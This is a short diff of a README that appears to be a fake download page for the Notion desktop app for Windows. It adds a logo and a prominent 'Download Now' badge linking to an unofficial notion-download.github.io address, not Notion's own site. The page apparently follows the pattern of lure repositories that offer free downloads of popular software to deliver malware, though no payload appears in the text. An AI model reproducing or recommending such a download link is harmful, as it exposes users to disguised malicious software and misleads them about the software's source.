@@ -1,8 +1,10 @@
 # Notion — Download Notion workspace for Windows Free
 
-🔘 **Notion Download  Desktop:**
+😊 **Notion Download free for Desktop:**
 
-[![Download Now 😊](https://img.shields.io/badge/Download-Now-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://notion-download.github.io/.github/)
+![img](https://get.site/wp-content/uploads/bfi_thumb/notion-logo-38q8iq9lv8th4hlvppxhop7jceqbjc42hmlzlvwacni20k5ao.png)
+
+[![Download Now](https://img.shields.io/badge/Download-Now-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://notion-download.github.io/.github/)
 
 ## ⚙️ How to Use
 
